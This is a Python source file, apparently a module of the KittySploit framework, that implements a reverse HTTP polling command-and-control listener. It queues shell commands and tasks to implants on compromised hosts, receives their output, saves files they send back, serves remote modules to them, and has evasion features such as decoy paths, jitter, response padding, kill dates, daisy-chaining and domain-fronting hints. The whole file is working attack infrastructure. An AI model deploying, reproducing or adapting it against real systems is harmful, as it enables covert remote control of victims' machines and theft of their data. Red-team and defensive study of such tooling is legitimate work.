#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import random
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from kittysploit import *

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.beacon_timing import pad_response
from lib.c2.ops_log import get_ops_log


def _decode_agent_bytes(raw: bytes) -> str:
    """Decode implant stdout. Windows cmd.exe is often OEM (CP850), not UTF-8."""
    if not raw:
        return ""
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        pass
    for enc in ("cp850", "cp437", "cp1252", "latin-1"):
        try:
            return raw.decode(enc)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", errors="replace")


class Module(Listener):
    __info__ = {
        "name": "Reverse HTTP Polling Listener",
        "description": (
            "HTTP polling C2 with beacon profiles, daisy-chain hops, "
            "cover-traffic decoys, and implant identity verification."
        ),
        "author": "KittySploit Team",
        "version": "2.2.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "http_polling",
    }

    lhost = OptString("0.0.0.0", "Listen address", True)
    lport = OptPort(8088, "Listen port", True)
    url_prefix = OptString("/c2", "URL prefix", False)
    poll_interval = OptInteger(10, "Suggested base poll interval (seconds)", False, True)
    jitter_percent = OptInteger(35, "Jitter percent sent to agents", False, True)
    kill_date = OptString("", "Kill date ISO (YYYY-MM-DD); empty=never", False, True)
    working_hours = OptString("", "Active window HH:MM-HH:MM; empty=always", False, True)
    timezone = OptString("UTC", "Timezone for kill date / working hours", False, True)
    sleep_outside_hours = OptInteger(3600, "Sleep seconds when outside working hours", False, True)
    user_agent = OptString("Mozilla/5.0", "User-Agent hint echoed to agents", False, True)
    host_header = OptString(
        "",
        "Domain-front Host header hint for redirector generate (toward origin)",
        False,
        True,
    )
    payload_comms_host = OptString(
        "",
        "CDN/front hostname hint for redirector generate (implant connect host)",
        False,
        True,
    )
    cover_traffic = OptBool(True, "Serve decoy HTTP paths for cover traffic", False, True)
    response_pad_min = OptInteger(0, "Minimum JSON response size (0=off)", False, True)
    stale_timeout = OptInteger(180, "Alert when agent silent for N seconds (0=off)", False, True)
    alert_on_stale = OptBool(True, "Alert on stale polling agents", False, True)
    implant_public_key = OptString("", "Expected implant Ed25519 public key PEM (from payload build)", False, True)
    allow_chained = OptBool(True, "Accept daisy-chained implants (X-KS-Chain-Token/Via)", False, True)
    chain_token = OptString("", "Expected chain token (empty=do not validate token)", False, True)
    callback_notify_url = OptString(
        "",
        "Optional webhook URL POSTed as JSON on new implant check-in",
        False,
        True,
    )
    ssl_cert = OptString("", "PEM certificate path for HTTPS listener", False, True)
    ssl_key = OptString("", "PEM private key path for HTTPS listener", False, True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.httpd = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}
        self._last_seen = {}
        self._stale_alerted = set()
        self._session_profiles = {}
        self._killed_sessions = set()
        self._in_flight_tasks = {}  # session_id -> [task_id, ...] awaiting /result
        self._decoy_paths = ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status", "/login"]
        self._denied_implants = set()  # implant ids retired via kill_agent / sessions kill

    def _ops(self):
        return get_ops_log(self.framework)

    def _opt_str(self, name: str, default: str = "") -> str:
        attr = getattr(self, name, default)
        if hasattr(attr, "value"):
            return str(getattr(attr, "value") or default)
        return str(attr if attr is not None else default)

    def _opt_bool(self, name: str, default: bool = False) -> bool:
        attr = getattr(self, name, default)
        if hasattr(attr, "value"):
            return bool(getattr(attr, "value"))
        return bool(attr)

    def _notify_new_implant(self, client_id: str, client_ip: str, session_id: str, chained: bool, chain_via: str):
        url = self._opt_str("callback_notify_url", "").strip()
        if not url:
            return
        payload = {
            "event": "implant_checkin",
            "implant_id": client_id,
            "client_ip": client_ip,
            "session_id": session_id,
            "chained": bool(chained),
            "chain_via": chain_via or "",
            "listener": "reverse_http_polling",
        }
        try:
            import json as _json
            import urllib.request as _urlreq

            data = _json.dumps(payload).encode("utf-8")
            req = _urlreq.Request(
                url,
                data=data,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "KittySploit-C2/1"},
            )
            threading.Thread(
                target=lambda: _urlreq.urlopen(req, timeout=5).read(),
                daemon=True,
            ).start()
        except Exception:
            pass

    def _check_chain_headers(self, headers) -> tuple:
        """Return (ok, chained, token, via)."""
        from lib.c2.chain import CHAIN_TOKEN_HEADER, CHAIN_VIA_HEADER, validate_chain_token

        token = ""
        via = ""
        try:
            token = str(headers.get(CHAIN_TOKEN_HEADER) or headers.get(CHAIN_TOKEN_HEADER.lower()) or "")
            via = str(headers.get(CHAIN_VIA_HEADER) or headers.get(CHAIN_VIA_HEADER.lower()) or "")
        except Exception:
            pass
        chained = bool(token or via)
        if chained and not self._opt_bool("allow_chained", True):
            return False, True, token, via
        expected = self._opt_str("chain_token", "").strip()
        if chained and expected and not validate_chain_token(token, expected):
            return False, True, token, via
        return True, chained, token, via

    def _base_profile(self) -> BeaconProfile:
        return BeaconProfile.from_opts(self, decoy_paths=self._decoy_paths)

    def _profile_for(self, session_id: str = "") -> BeaconProfile:
        base = self._base_profile()
        if not session_id:
            return base
        overrides = self._session_profiles.get(session_id) or {}
        if not overrides:
            return base
        return base.with_overrides(**overrides)

    def set_session_profile(self, session_id: str, **overrides):
        """Overlay beacon settings for one session (sleep, kill_date, hours, …)."""
        current = dict(self._session_profiles.get(session_id) or {})
        for key, value in overrides.items():
            if value is None:
                current.pop(key, None)
            else:
                current[key] = value
        if current:
            self._session_profiles[session_id] = current
        else:
            self._session_profiles.pop(session_id, None)
        # Persist so Waiting sessions keep overrides across restart
        sm = getattr(self.framework, "session_manager", None) if self.framework else None
        if sm:
            try:
                sm.update_session_data(str(session_id), {"beacon_overrides": dict(current)})
            except Exception:
                pass

    def _verify_client(self, client_id: str, sig_b64: str) -> bool:
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if not pub or not sig_b64:
            return not pub
        try:
            pad = "=" * (-len(sig_b64) % 4)
            sig = base64.urlsafe_b64decode(sig_b64 + pad)
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import ed25519

            key = serialization.load_pem_public_key(pub.encode())
            if not isinstance(key, ed25519.Ed25519PublicKey):
                return False
            key.verify(sig, client_id.encode("utf-8"))
            return True
        except Exception:
            return False

    def _listener_module_name(self) -> str:
        # Prefer filesystem path over display __info__ name for durable rebind
        for attr in ("path", "module_path", "fullname"):
            val = getattr(self, attr, None)
            if val and "listener" in str(val).lower().replace("\\", "/"):
                return str(val).replace("\\", "/")
        name = str(getattr(self, "name", "") or "")
        if "poll" in name.lower():
            return "listeners/multi/reverse_http_polling"
        return name or "listeners/multi/reverse_http_polling"

    def _bind_client_maps(self, client_id: str, session_id: str) -> None:
        self._client_id_to_session[client_id] = session_id
        self._session_to_client_id[session_id] = client_id
        self._pending_commands.setdefault(session_id, [])
        self._in_flight_tasks.setdefault(session_id, [])
        self._received_output.setdefault(session_id, [])
        self._last_seen[session_id] = time.time()

    def _restore_pending_queue(self, session_id: str) -> int:
        """Rebuild RAM queue from durable C2Task rows (queued/sent)."""
        if self._pending_commands.get(session_id):
            return 0
        try:
            pending = self._ops().list_pending_for_session(session_id, include_sent=True)
        except Exception:
            pending = []
        restored = 0
        for rec in pending:
            cmd = str(rec.get("command") or "")
            tid = str(rec.get("task_id") or "")
            if not cmd and not tid:
                continue
            # Typed tasks were logged as "cmd {json}"; keep as shell string for MVP restore
            self._pending_commands.setdefault(session_id, []).append(
                {"task_id": tid, "command": cmd}
            )
            restored += 1
        return restored

    def _reattach_session(
        self,
        session_id: str,
        client_id: str,
        client_ip: str,
        *,
        chained: bool = False,
        chain_via: str = "",
        announce: bool = True,
    ) -> str:
        """Rebind an existing durable session to this listener instance."""
        sm = getattr(self.framework, "session_manager", None) if self.framework else None
        updates = {
            "listener_id": self.listener_id,
            "listener_module": self._listener_module_name(),
            "listener_type": "reverse_http_polling",
            "protocol": "http_polling",
            "client_id": client_id,
            "implant_id": client_id,
            "client_ip": client_ip,
            "transport_state": "connected",
            "pending_rebind": False,
            "durable": True,
            "chained": bool(chained),
            "chain_via": str(chain_via or ""),
        }
        bind = getattr(self, "_listener_bind_snapshot", None)
        if isinstance(bind, dict):
            updates["listener_bind"] = bind
        if sm:
            sm.update_session_data(session_id, updates)
            # Keep host fresh
            try:
                sess = sm.get_session(session_id)
                if sess and client_ip:
                    sess.host = client_ip
            except Exception:
                pass
        if self.framework and hasattr(self.framework, "active_listeners"):
            self.framework.active_listeners[self.listener_id] = self
        self._bind_client_maps(client_id, session_id)
        n = self._restore_pending_queue(session_id)
        if announce:
            print_success(
                f"HTTP polling agent {client_id} reconnected -> session {session_id}"
                + (f" ({n} queued task(s) restored)" if n else "")
            )
            if self.framework and hasattr(self.framework, "notify_session_reconnected"):
                self.framework.notify_session_reconnected(session_id, label=str(client_id))
        return session_id

    def _rehydrate_from_session_manager(self) -> int:
        """On listener start, map restored beacon sessions to this listener."""
        sm = getattr(self.framework, "session_manager", None) if self.framework else None
        if not sm:
            return 0
        bound = 0
        for session in list(sm.get_sessions() or []):
            data = session.data or {}
            if not sm._is_durable_beacon_session(session.session_type, data):
                continue
            client_id = str(data.get("implant_id") or data.get("client_id") or "").strip()
            if not client_id:
                continue
            if hasattr(sm, "is_implant_retired") and sm.is_implant_retired(client_id):
                continue
            if session.id in getattr(sm, "_removed_session_ids", set()):
                continue
            # Skip if another active map already owns this implant on this listener
            if client_id in self._client_id_to_session:
                continue
            sid = session.id
            # Point session at this listener UUID without announcing reconnect yet
            rehydrate_updates = {
                "listener_id": self.listener_id,
                "listener_module": self._listener_module_name(),
                "listener_type": "reverse_http_polling",
                "transport_state": "disconnected",
                "pending_rebind": True,
                "durable": True,
            }
            bind = getattr(self, "_listener_bind_snapshot", None)
            if isinstance(bind, dict):
                rehydrate_updates["listener_bind"] = bind
            sm.update_session_data(sid, rehydrate_updates)
            if self.framework and hasattr(self.framework, "active_listeners"):
                self.framework.active_listeners[self.listener_id] = self
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands.setdefault(sid, [])
            self._in_flight_tasks.setdefault(sid, [])
            self._received_output.setdefault(sid, [])
            # Restore durable per-session beacon overrides into RAM
            stored = (session.data or {}).get("beacon_overrides") if session.data else None
            if isinstance(stored, dict) and stored:
                self._session_profiles[sid] = dict(stored)
            n = self._restore_pending_queue(sid)
            bound += 1
            if n:
                print_info(f"Restored {n} pending task(s) for implant {client_id} ({sid[:8]})")
        return bound

    def _ensure_session(self, client_id, client_ip, sig: str = "", *, chained: bool = False, chain_via: str = ""):
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if pub and not self._verify_client(client_id, sig):
            return None

        sm = getattr(self.framework, "session_manager", None) if self.framework else None
        denied = getattr(self, "_denied_implants", None) or set()
        retired = bool(sm and hasattr(sm, "is_implant_retired") and sm.is_implant_retired(client_id))

        if client_id in self._client_id_to_session:
            sid = self._client_id_to_session[client_id]
            removed = sid in getattr(sm, "_removed_session_ids", set()) if sm else False
            if sid in self._killed_sessions or client_id in denied or removed:
                # Deliver die=true once, then drop — do not revive
                self._killed_sessions.add(sid)
                return sid
            self._last_seen[sid] = time.time()
            if sm:
                sess = sm.get_session(sid)
                data = (sess.data if sess else {}) or {}
                if data.get("transport_state") == "disconnected" or data.get("pending_rebind"):
                    return self._reattach_session(
                        sid, client_id, client_ip, chained=chained, chain_via=chain_via
                    )
                sm.update_session_data(
                    sid,
                    {
                        "transport_state": "connected",
                        "client_ip": client_ip,
                        "listener_id": self.listener_id,
                    },
                )
            return sid

        # In-process deny after sessions kill: no new durable session this run
        if client_id in denied:
            return None

        # Revive existing durable session unless implant was retired via kill
        if sm and not retired:
            sid = sm.find_beacon_session_by_implant(
                client_id, listener_module=self._listener_module_name()
            )
            if not sid:
                sid = sm.revive_beacon_session_from_db(
                    client_id, listener_module=self._listener_module_name()
                )
            if sid:
                if sid in getattr(sm, "_removed_session_ids", set()):
                    return None
                return self._reattach_session(
                    sid, client_id, client_ip, chained=chained, chain_via=chain_via
                )

        data = {
            "protocol": "http_polling",
            "client_id": client_id,
            "implant_id": client_id,
            "client_ip": client_ip,
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "reverse_http_polling",
            "pty_mode": False,
            "chained": bool(chained),
            "chain_via": str(chain_via or ""),
            "transport_state": "connected",
            "durable": True,
        }
        bind = getattr(self, "_listener_bind_snapshot", None)
        if isinstance(bind, dict):
            data["listener_bind"] = bind
        else:
            try:
                from lib.c2.durable_listeners import snapshot_from_module

                data["listener_bind"] = snapshot_from_module(self)
            except Exception:
                pass
        sid = self._create_session("reverse", client_ip, 0, data)
        if sid:
            self._bind_client_maps(client_id, sid)
            chain_note = f" via={chain_via}" if chained else ""
            print_success(f"HTTP polling agent {client_id} ({client_ip}) -> session {sid}{chain_note}")
            self._notify_new_implant(client_id, client_ip, sid, chained, chain_via)
        return sid

    def _encode_poll_body(self, payload: dict) -> str:
        body = json.dumps(payload)
        pad = int(getattr(getattr(self, "response_pad_min", None), "value", self.response_pad_min) or 0)
        if pad > 0:
            body = pad_response(body, pad)
        return body

    def _normalize_queue_item(self, item):
        """Accept legacy strings, shell dicts, or typed AgentTask dicts."""
        if isinstance(item, dict):
            if item.get("task") and isinstance(item["task"], dict):
                return {
                    "task_id": str(item.get("task_id") or item["task"].get("task_id") or ""),
                    "command": "",
                    "task": item["task"],
                    "encoding": "task",
                }
            if item.get("encoding") == "task" or (
                item.get("command") and str(item.get("command")).startswith("{")
            ):
                return {
                    "task_id": str(item.get("task_id") or ""),
                    "command": str(item.get("command") or ""),
                    "task": item.get("task"),
                    "encoding": "task",
                }
            return {
                "task_id": str(item.get("task_id") or ""),
                "command": str(item.get("command") or ""),
                "task": None,
                "encoding": "base64",
            }
        return {"task_id": "", "command": str(item or ""), "task": None, "encoding": "base64"}

    def _build_poll_response(self, session_id: str) -> tuple:
        """Assemble /poll JSON. Returns ``(body, has_task)`` — task is only
        committed via ``_commit_poll_dispatch`` after a successful socket write.
        """
        profile = self._profile_for(session_id)

        if profile.is_past_kill_date() or session_id in self._killed_sessions:
            self._killed_sessions.add(session_id)
            for item in list(self._pending_commands.get(session_id) or []):
                tid = self._normalize_queue_item(item).get("task_id")
                if tid:
                    try:
                        self._ops().mark_killed(tid)
                    except Exception:
                        pass
            self._pending_commands[session_id] = []
            payload = profile.to_poll_dict(die=True)
            # Drop maps after instructing implant to die
            cid = self._session_to_client_id.pop(session_id, None)
            if cid:
                self._client_id_to_session.pop(cid, None)
                if not hasattr(self, "_denied_implants"):
                    self._denied_implants = set()
                self._denied_implants.add(str(cid))
            return self._encode_poll_body(payload), False

        if not profile.is_within_working_hours():
            payload = profile.to_poll_dict(outside_hours=True)
            return self._encode_poll_body(payload), False

        queue = self._pending_commands.get(session_id, [])
        item = self._normalize_queue_item(queue[0]) if queue else None
        payload = profile.to_poll_dict(command="")
        has_task = False
        if item:
            tid = item.get("task_id") or ""
            if item.get("encoding") == "task" and item.get("task"):
                task = item["task"]
                payload["encoding"] = "task"
                payload["task"] = task
                payload["command"] = json.dumps(task, ensure_ascii=False)
                has_task = True
            elif item.get("encoding") == "task" and item.get("command"):
                payload["encoding"] = "task"
                payload["command"] = item["command"]
                try:
                    payload["task"] = json.loads(item["command"])
                except Exception:
                    payload["task"] = {"command": "shell", "args": {"cmd": item["command"]}, "task_id": tid}
                has_task = True
            else:
                cmd = item.get("command") or ""
                if cmd:
                    payload["command"] = base64.b64encode(cmd.encode()).decode()
                    payload["encoding"] = "base64"
                    has_task = True
        return self._encode_poll_body(payload), has_task

    def _commit_poll_dispatch(self, session_id: str) -> None:
        """Pop + mark_sent after a poll response was fully written to the socket."""
        queue = self._pending_commands.get(session_id, [])
        if not queue:
            return
        item = self._normalize_queue_item(queue.pop(0))
        tid = item.get("task_id") or ""
        if tid:
            try:
                self._ops().mark_sent(tid)
            except Exception:
                pass
            self._in_flight_tasks.setdefault(session_id, []).append(tid)
            try:
                cmd_name = ""
                if isinstance(item.get("task"), dict):
                    cmd_name = str(item["task"].get("command") or "")
                print_info(
                    f"Dispatched task {tid[:8]}… to session {session_id[:8]}…"
                    + (f" ({cmd_name})" if cmd_name else "")
                )
            except Exception:
                pass

    def _stale_watch_loop(self):
        timeout = int(self.stale_timeout or 0)
        if timeout <= 0:
            return
        while self.running:
            time.sleep(max(5, timeout // 4))
            now = time.time()
            for sid, last in list(self._last_seen.items()):
                if now - last < timeout:
                    continue
                if sid in self._stale_alerted:
                    continue
                self._stale_alerted.add(sid)
                if not bool(self.alert_on_stale):
                    continue
                cid = self._session_to_client_id.get(sid, sid[:8])
                print_warning(f"HTTP polling agent stale: {cid} (no poll for {timeout}s)")
                if self.framework and hasattr(self.framework, "notify_session_disconnected"):
                    self.framework.notify_session_disconnected(
                        sid,
                        reason=f"stale>{timeout}s",
                        label=str(cid),
                    )

    def _handler_class(self):
        listener = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _prefix(self) -> str:
                return "/" + str(listener._opt_str("url_prefix", "/c2") or "/c2").strip("/")

            def _send(self, status, body, ctype="text/plain") -> bool:
                data = body.encode("utf-8") if isinstance(body, str) else body
                try:
                    self.send_response(status)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Content-Length", str(len(data)))
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(data)
                    try:
                        self.wfile.flush()
                    except Exception:
                        pass
                    return True
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                    # Client gone mid-response (common with short-lived poll implants on Windows)
                    return False

            def handle_one_request(self):
                try:
                    super().handle_one_request()
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                    pass

            def do_GET(self):
                try:
                    parsed = urlparse(self.path)
                    path = parsed.path
                    prefix = self._prefix()

                    if listener.cover_traffic and path in listener._decoy_paths:
                        decoys = ["OK", "healthy", "200", "<!-- static -->"]
                        self._send(200, random.choice(decoys))
                        return

                    if path != f"{prefix}/poll":
                        if path == f"{prefix}/module":
                            qs = parse_qs(parsed.query)
                            cid = (qs.get("id") or [""])[0]
                            sig = (qs.get("sig") or [""])[0]
                            mod_path = (qs.get("path") or [""])[0]
                            language = (qs.get("language") or ["python"])[0]
                            if not cid or not mod_path:
                                self._send(400, "missing id or path")
                                return
                            ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
                            if not ok_chain:
                                self._send(403, "chain not allowed")
                                return
                            sid = listener._ensure_session(
                                cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
                            )
                            if not sid:
                                self._send(403, "invalid implant signature")
                                return
                            from lib.c2.remote_module_server import resolve_remote_module

                            spec = resolve_remote_module(
                                listener.framework,
                                mod_path,
                                language=language,
                            )
                            if spec is None:
                                self._send(404, "module not found")
                                return
                            self._send(200, json.dumps(spec.to_dict(), ensure_ascii=False), "application/json")
                            return
                        self._send(404, "not found")
                        return

                    qs = parse_qs(parsed.query)
                    cid = (qs.get("id") or [""])[0]
                    sig = (qs.get("sig") or [""])[0]
                    if not cid:
                        self._send(400, "missing id")
                        return
                    ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
                    if not ok_chain:
                        self._send(403, "chain not allowed")
                        return
                    sid = listener._ensure_session(
                        cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
                    )
                    if not sid:
                        self._send(403, "invalid implant signature")
                        return
                    body, has_task = listener._build_poll_response(sid)
                    if self._send(200, body, "application/json") and has_task:
                        listener._commit_poll_dispatch(sid)
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                    return

            def do_POST(self):
                try:
                    parsed = urlparse(self.path)
                    prefix = self._prefix()
                    if parsed.path != f"{prefix}/result":
                        self._send(404, "not found")
                        return
                    length = int(self.headers.get("Content-Length", "0") or 0)
                    raw_bytes = self.rfile.read(length) if length > 0 else b""
                    # If Content-Length lied / connection truncated, still try what we got
                    if length > 0 and len(raw_bytes) < length:
                        extra = self.rfile.read(length - len(raw_bytes))
                        if extra:
                            raw_bytes += extra
                    raw = raw_bytes.decode("utf-8", errors="replace")
                    qs = parse_qs(parsed.query)
                    cid = (qs.get("id") or [""])[0]
                    sig = (qs.get("sig") or [""])[0]
                    if not cid:
                        self._send(400, "missing id")
                        return
                    ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
                    if not ok_chain:
                        self._send(403, "chain not allowed")
                        return
                    sid = listener._ensure_session(
                        cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
                    )
                    if not sid:
                        self._send(403, "invalid implant signature")
                        return
                    data = {}
                    output = ""
                    try:
                        data = json.loads(raw) if raw else {}
                        output = data.get("output", "")
                        if data.get("encoding") == "base64":
                            try:
                                output = _decode_agent_bytes(base64.b64decode(output))
                            except Exception:
                                output = str(output)
                    except Exception:
                        output = raw
                        data = {}
                    # Always append (even empty) so polling-shell wait can unblock
                    listener._append_output(sid, output if output != "" else "(command returned no output)")
                    try:
                        files = data.get("files") if isinstance(data, dict) else None
                        if files:
                            listener._save_agent_files(sid, files)
                    except Exception:
                        pass
                    listener._complete_inflight_task(sid, output)
                    try:
                        preview = (output or "").replace("\n", " ")[:80]
                        print_success(f"Result from {cid}: {len(output or '')} bytes — {preview}")
                    except Exception:
                        pass
                    self._send(200, "ok")
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                    return

        return Handler

    def run(self, background=False, quiet=False):
        host = str(self.lhost or "0.0.0.0")
        port = int(self.lport or 8088)
        self.httpd = ThreadingHTTPServer((host, port), self._handler_class())

        cert = self._opt_str("ssl_cert", "").strip()
        key = self._opt_str("ssl_key", "").strip()
        use_https = bool(cert and key)
        if use_https:
            try:
                import ssl
                from pathlib import Path

                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(certfile=str(Path(cert).expanduser()), keyfile=str(Path(key).expanduser()))
                self.httpd.socket = ctx.wrap_socket(self.httpd.socket, server_side=True)
            except Exception as exc:
                print_error(f"Failed to enable HTTPS: {exc}")
                return False

        self.running = True
        # Snapshot bind options before rehydrate so Waiting sessions get listener_bind
        try:
            from lib.c2.durable_listeners import save_module_listener, snapshot_from_module

            self._listener_bind_snapshot = snapshot_from_module(self)
            save_module_listener(self.framework, self)
        except Exception:
            self._listener_bind_snapshot = None

        rebound = self._rehydrate_from_session_manager()
        self.listener_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.listener_thread.start()
        threading.Thread(target=self._stale_watch_loop, daemon=True).start()

        if not quiet:
            profile = self._base_profile()
            scheme = "https" if use_https else "http"
            print_success(f"Reverse HTTP polling listener on {scheme}://{host}:{port}{self.url_prefix}")
            if rebound:
                print_info(
                    f"Durable C2: bound {rebound} restored beacon session(s) "
                    f"(waiting for check-in)"
                )
            print_info("Agent: GET /c2/poll?id=<implant_id>&sig=<b64url>, POST /c2/result?id=<implant_id>&sig=...")
            print_info("Remote modules: GET /c2/module?id=<implant_id>&path=<module_path>&language=python")
            if profile.kill_date:
                print_info(f"Beacon kill_date={profile.kill_date} tz={profile.timezone}")
            if profile.working_hours:
                print_info(
                    f"Beacon working_hours={profile.working_hours} "
                    f"tz={profile.timezone} outside_sleep={profile.sleep_outside_hours}s"
                )
            if self._opt_bool("allow_chained", True):
                tok = self._opt_str("chain_token", "")
                print_info(
                    "Daisy-chain enabled"
                    + (f" (token required)" if tok else " (token optional)")
                )
            notify = self._opt_str("callback_notify_url", "")
            if notify:
                print_info(f"Callback notify webhook: {notify}")

        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd, operator: str = "console"):
        if session_id in self._killed_sessions:
            return
        profile = self._profile_for(session_id)
        if profile.is_past_kill_date():
            self._killed_sessions.add(session_id)
            return
        implant_id = self._session_to_client_id.get(session_id, "")
        task_id = ""
        try:
            task_id = self._ops().log_queued(
                session_id=str(session_id),
                command=str(cmd),
                implant_id=str(implant_id),
                operator=str(operator or "console"),
                listener_type="reverse_http_polling",
            )
        except Exception:
            task_id = ""
        self._pending_commands.setdefault(session_id, []).append(
            {"task_id": task_id, "command": str(cmd)}
        )

    def set_pending_task(self, session_id, task, operator: str = "console"):
        """Queue a typed AgentTask (dict or AgentTask)."""
        from lib.c2.task_protocol import AgentTask

        if session_id in self._killed_sessions:
            return None
        profile = self._profile_for(session_id)
        if profile.is_past_kill_date():
            self._killed_sessions.add(session_id)
            return None
        if isinstance(task, AgentTask):
            task_obj = task
        elif isinstance(task, dict):
            task_obj = AgentTask.from_dict(task)
        else:
            return None
        if not task_obj:
            return None
        implant_id = self._session_to_client_id.get(session_id, "")
        try:
            logged = self._ops().log_queued(
                session_id=str(session_id),
                command=f"{task_obj.command} {json.dumps(task_obj.args, ensure_ascii=False)}".strip(),
                implant_id=str(implant_id),
                operator=str(operator or "console"),
                listener_type="reverse_http_polling",
                task_id=task_obj.task_id,
            )
            task_obj.task_id = logged or task_obj.task_id
        except Exception:
            pass
        self._pending_commands.setdefault(session_id, []).append(
            {
                "task_id": task_obj.task_id,
                "encoding": "task",
                "task": task_obj.to_dict(),
                "command": task_obj.to_wire(),
            }
        )
        return task_obj.task_id

    def _save_agent_files(self, session_id, files):
        import os
        from pathlib import Path

        out_dir = Path(os.path.expanduser("~/.kittysploit/agent_files")) / str(session_id)[:12]
        out_dir.mkdir(parents=True, exist_ok=True)
        for entry in files or []:
            if not isinstance(entry, dict):
                continue
            name = Path(str(entry.get("path") or "file.bin")).name
            data = entry.get("data") or ""
            try:
                blob = base64.b64decode(data) if entry.get("encoding") == "base64" else str(data).encode()
            except Exception:
                continue
            dest = out_dir / name
            dest.write_bytes(blob)
            print_success(f"Agent file saved: {dest} ({len(blob)} bytes)")

    def retire_beacon_session(self, session_id: str, *, remove: bool = True) -> None:
        """Stop accepting work for a beacon and drop it from durable restore.

        Keeps implant→session maps briefly so one last poll can receive ``die=true``.
        Pending C2 tasks are marked killed so they are not restored on restart.
        """
        sid = str(session_id or "")
        if not sid:
            return
        self._killed_sessions.add(sid)
        for item in list(self._pending_commands.get(sid) or []):
            tid = self._normalize_queue_item(item).get("task_id")
            if tid:
                try:
                    self._ops().mark_killed(tid)
                except Exception:
                    pass
        self._pending_commands[sid] = []
        self._in_flight_tasks[sid] = []
        try:
            self._ops().kill_pending_for_session(sid)
        except Exception:
            pass
        self._session_profiles.pop(sid, None)
        self._received_output.pop(sid, None)
        self._stale_alerted.discard(sid)
        # Resolve implant id from maps OR session data (Waiting sessions may lack maps)
        cid = self._session_to_client_id.get(sid)
        if not cid and self.framework and hasattr(self.framework, "session_manager"):
            try:
                sess = self.framework.session_manager.get_session(sid)
                data = (sess.data if sess else {}) or {}
                cid = str(data.get("implant_id") or data.get("client_id") or "").strip() or None
                if cid and sid not in self._session_to_client_id:
                    self._session_to_client_id[sid] = cid
                    self._client_id_to_session.setdefault(cid, sid)
            except Exception:
                cid = None
        if cid:
            if not hasattr(self, "_denied_implants"):
                self._denied_implants = set()
            self._denied_implants.add(str(cid))
        if remove and self.framework and hasattr(self.framework, "session_manager"):
            try:
                self.framework.session_manager.remove_session(sid)
            except Exception:
                pass
        if remove and self.framework and hasattr(self.framework, "shell_manager"):
            try:
                self.framework.shell_manager.remove_shell(sid)
            except Exception:
                pass

    def _complete_inflight_task(self, session_id, output: str):
        inflight = self._in_flight_tasks.get(session_id) or []
        if not inflight:
            return
        task_id = inflight.pop(0)
        try:
            self._ops().mark_completed(task_id, output=str(output or ""))
        except Exception:
            pass
        # Exit / bye from implant → drop durable session
        text = str(output or "").strip().lower()
        if text in ("bye", "bye!", "exiting", "exit"):
            self.retire_beacon_session(session_id, remove=True)

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]
        self._last_seen[session_id] = time.time()
        self._stale_alerted.discard(session_id)

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.httpd:
            self.httpd.shutdown()
